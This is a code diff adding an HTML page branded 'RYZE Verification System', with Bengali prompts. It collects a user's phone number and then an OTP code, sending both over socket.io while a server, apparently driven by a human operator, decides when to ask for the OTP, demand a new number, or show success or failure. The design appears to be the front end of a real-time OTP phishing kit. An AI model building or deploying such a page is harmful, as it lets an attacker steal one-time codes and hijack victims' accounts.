@@ -1,0 +1,110 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>RYZE Verification System</title>
+    <script src="/socket.io/socket.io.js"></script>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        .hidden { display: none; }
+        .ryze-bg { background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%); }
+    </style>
+</head>
+<body class="ryze-bg min-h-screen flex items-center justify-center font-sans text-white">
+
+    <div id="app-card" class="bg-[#0f3460] p-8 rounded-2xl shadow-2xl w-full max-w-md border border-blue-500">
+        <div class="text-center mb-8">
+            <h1 class="text-4xl font-bold tracking-widest text-blue-400">RYZE</h1>
+            <p class="text-gray-400">Secure Identity Verification</p>
+        </div>
+
+        <!-- Step 1: Phone Input -->
+        <div id="step-phone">
+            <label class="block mb-2 text-sm">আপনার মোবাইল নম্বর দিন</label>
+            <input type="text" id="phone" placeholder="017XXXXXXXX" class="w-full p-3 rounded bg-[#1a1a2e] border border-blue-900 focus:border-blue-500 outline-none mb-4">
+            <button onclick="sendPhone()" class="w-full bg-blue-600 hover:bg-blue-700 p-3 rounded font-bold transition">Verify Number</button>
+        </div>
+
+        <!-- Step 2: Waiting -->
+        <div id="step-waiting" class="hidden text-center py-10">
+            <div class="animate-spin h-10 w-10 border-4 border-blue-500 border-t-transparent rounded-full mx-auto mb-4"></div>
+            <p id="wait-msg">আপনার নম্বরটি যাচাই করা হচ্ছে... অপেক্ষা করুন।</p>
+        </div>
+
+        <!-- Step 3: OTP Input -->
+        <div id="step-otp" class="hidden">
+            <label class="block mb-2 text-sm text-yellow-400">আপনার মোবাইলে পাঠানো OTP কোডটি লিখুন</label>
+            <input type="text" id="otp" placeholder="Enter OTP" class="w-full p-3 rounded bg-[#1a1a2e] border border-blue-900 focus:border-blue-500 outline-none mb-4 text-center text-xl tracking-widest">
+            <button onclick="sendOTP()" class="w-full bg-green-600 hover:bg-green-700 p-3 rounded font-bold transition">Submit OTP</button>
+        </div>
+
+        <!-- Step 4: Success/Fail Popups -->
+        <div id="status-popup" class="hidden fixed inset-0 flex items-center justify-center bg-black bg-opacity-80">
+            <div class="bg-white text-black p-8 rounded-xl text-center max-w-xs">
+                <div id="status-icon" class="text-5xl mb-4"></div>
+                <h2 id="status-title" class="text-2xl font-bold mb-2"></h2>
+                <p id="status-desc" class="mb-6"></p>
+                <button onclick="location.reload()" class="bg-blue-600 text-white px-6 py-2 rounded-full">Close</button>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        const socket = io();
+
+        function sendPhone() {
+            const phone = document.getElementById('phone').value;
+            if(!phone) return alert("নম্বর দিন");
+            socket.emit('send_phone', phone);
+            showStep('step-waiting');
+        }
+
+        function sendOTP() {
+            const otp = document.getElementById('otp').value;
+            if(!otp) return alert("OTP লিখুন");
+            socket.emit('send_otp', otp);
+            document.getElementById('wait-msg').innerText = "OTP যাচাই করা হচ্ছে...";
+            showStep('step-waiting');
+        }
+
+        socket.on('show_otp_input', () => {
+            showStep('step-otp');
+        });
+
+        socket.on('retry_phone', () => {
+            alert("আপনার নম্বরটি ভুল ছিল। দয়া করে সঠিক নম্বর দিন।");
+            showStep('step-phone');
+        });
+
+        socket.on('final_status', (data) => {
+            const popup = document.getElementById('status-popup');
+            const title = document.getElementById('status-title');
+            const icon = document.getElementById('status-icon');
+            const desc = document.getElementById('status-desc');
+
+            popup.classList.remove('hidden');
+            if(data.status === 'success') {
+                title.innerText = "Congratulations!";
+                icon.innerText = "🎉";
+                desc.innerText = "আপনার ভেরিফিকেশন সফল হয়েছে। RYZE-এ আপনাকে স্বাগতম।";
+            } else {
+                title.innerText = "Verification Failed";
+                icon.innerText = "❌";
+                desc.innerText = "ভুল OTP দিয়েছেন। আবার চেষ্টা করুন।";
+                setTimeout(() => {
+                    popup.classList.add('hidden');
+                    showStep('step-otp');
+                }, 3000);
+            }
+        });
+
+        function showStep(stepId) {
+            document.getElementById('step-phone').classList.add('hidden');
+            document.getElementById('step-waiting').classList.add('hidden');
+            document.getElementById('step-otp').classList.add('hidden');
+            document.getElementById(stepId).classList.remove('hidden');
+        }
+    </script>
+</body>
+</html>
